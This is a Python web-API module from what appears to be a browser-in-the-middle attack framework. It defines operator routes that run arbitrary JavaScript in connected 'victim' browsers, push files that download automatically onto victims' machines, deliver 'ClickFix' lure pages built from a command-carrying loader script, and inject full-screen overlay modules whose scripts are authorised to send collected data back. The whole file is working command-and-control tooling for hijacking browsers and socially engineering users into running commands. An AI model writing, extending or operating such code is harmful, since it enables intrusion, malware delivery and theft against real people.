"""Operator command, file-delivery, and module execution routes."""

from .private_common import (
    APIRouter,
    CommandRequest,
    Depends,
    ExecuteModuleRequest,
    File,
    HTTPException,
    UploadFile,
    UploadValidationError,
    authorize_module_fetches,
    base64,
    configured_upload_limit,
    extract_scripts_from_html,
    get_module_content,
    get_template_content,
    json,
    logger,
    os,
    read_upload_limited,
    settings,
    substitute_params,
    validate_transfer_filename,
    verify_api_token,
    ws_manager,
)

api_router = APIRouter()


@api_router.post("/sessions/{victim_id}/exec")
async def execute_command(
    victim_id: str,
    payload: CommandRequest,
    auth: str = Depends(verify_api_token),
):
    """Execute command on victim via WebSocket"""
    if not ws_manager.is_victim_connected(victim_id):
        raise HTTPException(status_code=404, detail="Victim not connected")

    command = payload.command

    success = await ws_manager.send_to_victim(victim_id, f"exec:{command}")

    if success:
        logger.info("JS command delivered to victim %s", victim_id)
    else:
        logger.warning("Failed to deliver JS command to victim %s", victim_id)

    return {
        "victim_id": victim_id,
        "status": "sent" if success else "failed",
        "command": command
    }


@api_router.post("/sessions/{victim_id}/send-file")
async def send_file_to_victim(
    victim_id: str,
    file: UploadFile = File(...),
    auth: str = Depends(verify_api_token)
):
    """
    Send a file to victim's browser via WebSocket.
    The file will be downloaded automatically on the victim's machine.
    """
    try:
        # Validate victim connection
        if not ws_manager.is_victim_connected(victim_id):
            raise HTTPException(status_code=404, detail="Victim not connected")

        try:
            safe_filename = validate_transfer_filename(file.filename)
            file_content = await read_upload_limited(
                file,
                configured_upload_limit(),
            )
        except UploadValidationError as exc:
            status_code = 413 if "maximum size" in str(exc) else 400
            raise HTTPException(status_code=status_code, detail=str(exc)) from exc

        # Convert to base64 for WebSocket transmission
        file_base64 = base64.b64encode(file_content).decode('utf-8')

        # Send via WebSocket with 'file:filename|base64' format
        success = await ws_manager.send_to_victim(
            victim_id,
            f"file:{safe_filename}|{file_base64}"
        )

        if not success:
            raise HTTPException(status_code=500, detail="Failed to send file to victim")

        logger.info(
            "File %s (%s bytes) sent to victim %s",
            safe_filename,
            len(file_content),
            victim_id,
        )

        return {
            "success": True,
            "victim_id": victim_id,
            "filename": safe_filename,
            "size": len(file_content)
        }

    except HTTPException:
        raise
    except Exception as exc:
        logger.exception("Failed to send file to victim %s", victim_id)
        raise HTTPException(
            status_code=500,
            detail="Unable to deliver file",
        ) from exc


@api_router.post("/sessions/{victim_id}/clickfix")
async def send_clickfix(
    victim_id: str,
    request: CommandRequest,
    auth: str = Depends(verify_api_token)
):
    """
    Generate and send ClickFix HTML to victim via WebSocket
    Expects: { "command": "<JS_COMMAND>" }
    """
    try:
        # Validate victim connection
        if not ws_manager.is_victim_connected(victim_id):
            raise HTTPException(status_code=404, detail="Victim not connected")

        command = request.command

        # Load clickfix.html template
        clickfix_html = get_template_content("clickfix.html")
        if not clickfix_html:
            raise HTTPException(status_code=500, detail="Failed to load clickfix template")

        # Load loader.js template
        loader_js = get_template_content("loader.js")
        if not loader_js:
            raise HTTPException(status_code=500, detail="Failed to load loader.js template")

        # Replace COMMAND in loader.js
        updated_loader_js = loader_js.replace("COMMAND", command)

        # Inject script into HTML
        payload = {
            "html": clickfix_html,
            "js": updated_loader_js
        }

        # Encode to base64
        html_base64 = base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8')

        # Send via WebSocket
        ws_command = f"module:{html_base64}"
        success = await ws_manager.send_to_victim(victim_id, ws_command)

        if success:
            logger.info(f"✅ Attack sent to victim {victim_id}")
            return {
                "status": "success",
                "victim_id": victim_id,
                "command": command[:60] + "..." if len(command) > 60 else command
            }
        else:
            raise HTTPException(status_code=500, detail="Failed to send WebSocket message")

    except HTTPException:
        raise
    except Exception as exc:
        logger.exception("Failed to send ClickFix to victim %s", victim_id)
        raise HTTPException(
            status_code=500,
            detail="Unable to deliver ClickFix",
        ) from exc


@api_router.post("/sessions/{victim_id}/execute-module")
async def execute_module(
    victim_id: str,
    request: ExecuteModuleRequest,
    auth: str = Depends(verify_api_token)
):
    """
    Execute Module on victim via WebSocket
    Expects: { "module_id": "<MODULE_ID>", "params": {"0": "value", ...} }
    """
    try:
        # Validate victim connection
        if not ws_manager.is_victim_connected(victim_id):
            raise HTTPException(status_code=404, detail="Victim not connected")

        module_id = request.module_id
        params = request.params

        module_data = get_module_content(module_id)
        if not module_data:
            raise HTTPException(status_code=404, detail=f"Module {module_id} not found in storage")

        payload_html = module_data.get("payload") or ""
        if not payload_html:
            raise HTTPException(status_code=404, detail=f"Module {module_id} has no payload")

        payload_html = payload_html.replace("{{victim_id}}", victim_id).replace("{{module_id}}", module_id)

        safe_params = params or {}
        if safe_params:
            safe_params = {
                key: value.replace("{{victim_id}}", victim_id).replace("{{module_id}}", module_id)
                if isinstance(value, str)
                else value
                for key, value in safe_params.items()
            }

        rendered_html = substitute_params(payload_html, safe_params)

        # =============================================
        # AUTO-WRAP: overlay container + z-index + cleanup helper
        # Module authors only write content HTML + JS logic.
        # The backend wraps it in a fixed overlay with:
        #   - z-index: 999999, full-screen semi-transparent backdrop
        #   - unique ID for DOM removal
        #   - __removeModule() helper function injected automatically
        # =============================================
        wrapper_id = f"bitm-module-{module_id}"
        wrapper_css = (
            f"#{wrapper_id}{{position:fixed;top:0;left:0;width:100%;height:100%;"
            f"background:rgba(0,0,0,0.5);z-index:999999;display:flex;"
            f"justify-content:center;align-items:center;"
            f"animation:_bitmOverlayIn .2s ease-out;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}}"
            f"@keyframes _bitmOverlayIn{{from{{opacity:0}}to{{opacity:1}}}}"
        )
        cleanup_js = (
            f"function __removeModule(){{var el=document.getElementById('{wrapper_id}');if(el)el.remove();}}"
        )
        rendered_html = (
            f'<script>{cleanup_js}</script>'
            f'<div id="{wrapper_id}">{rendered_html}</div>'
            f'<style>{wrapper_css}</style>'
        )

        # Extract scripts from HTML
        cleaned_html, extracted_js = extract_scripts_from_html(rendered_html)

        logger.info(
            "Prepared module scripts for victim %s: %s characters",
            victim_id,
            len(extracted_js) if extracted_js else 0,
        )
        if extracted_js:
            extracted_js = substitute_params(extracted_js, safe_params)
            logger.info(
                "Applied module parameters for victim %s: %s characters",
                victim_id,
                len(extracted_js),
            )

        payload = {
            "html": cleaned_html,
            "js": ""
        }

        # Encode to base64
        html_base64 = base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8')

        # Send HTML first
        ws_command_html = f"module:{html_base64}"
        success = await ws_manager.send_to_victim(victim_id, ws_command_html)

        if not success:
            raise HTTPException(status_code=500, detail="Failed to send HTML")

        # If there are extracted scripts, send them as exec
        if extracted_js:
            logger.info(f"📜 Sending extracted scripts to victim {victim_id}")
            collection_token = ws_manager.get_collection_token(victim_id)
            if not collection_token:
                raise HTTPException(
                    status_code=409,
                    detail="Session collection authorization is unavailable",
                )
            extracted_js = authorize_module_fetches(
                extracted_js,
                victim_id,
                collection_token,
            )
            ws_command_js = f"exec:{extracted_js}"
            success = await ws_manager.send_to_victim(victim_id, ws_command_js)

            if not success:
                logger.warning(f"⚠️ HTML sent but scripts failed for victim {victim_id}")

        logger.info(f"✅ Module {module_id} executed on victim {victim_id}")
        return {
            "status": "success",
            "victim_id": victim_id,
            "module_id": module_id,
            "has_scripts": bool(extracted_js)
        }

    except HTTPException:
        raise
    except Exception as exc:
        logger.exception("Failed to execute module for victim %s", victim_id)
        raise HTTPException(
            status_code=500,
            detail="Unable to execute module",
        ) from exc


@api_router.get("/attacks")
async def get_available_attacks(auth: str = Depends(verify_api_token)):
    """Get list of available OneClick Attacks for this campaign"""
    try:
        attacks_dir = os.path.join(settings.STORAGE_PATH, "attacks")

        if not os.path.exists(attacks_dir):
            return {"attacks": []}

        attacks = []
        for filename in os.listdir(attacks_dir):
            if filename.endswith(('.html', '.js')):
                attack_id = filename.rsplit('.', 1)[0]
                attack_type = 'html' if filename.endswith('.html') else 'js'

                attacks.append({
                    "id": attack_id,
                    "type": attack_type,
                    "filename": filename
                })

        logger.info(f"📋 Found {len(attacks)} attacks in storage")
        return {"attacks": attacks}

    except Exception as e:
        logger.error(f"Error listing attacks: {e}")
        return {"attacks": []}
